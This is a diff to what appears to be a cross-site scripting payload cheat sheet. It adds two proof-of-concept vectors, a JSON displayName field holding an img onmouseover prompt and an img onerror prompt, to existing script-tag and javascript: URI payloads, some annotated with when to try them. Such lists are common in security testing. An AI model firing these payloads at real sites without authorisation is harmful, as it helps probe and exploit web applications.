@@ -7,6 +7,8 @@
 "`'><script>\x3Bjavascript:alert(1)</script>
 </TITLE><SCRIPT>alert(document.domain);</SCRIPT> 
 <<SCRIPT>alert("XSS");//\<</SCRIPT>
+`[{\"displayName\":\"<img src=x onmouseover=prompt(document.domain)>\"}]`
+`<img/src/onerror=prompt(document.domain)>`
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>     --> Do Try this if there is HTML Injection
 <a href="javascript:alert(document.domain)">XSS</a>                                --> Do Try this if there is HTML Injection
 <a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">XSS</a>             --> Do try this one for stored XSS
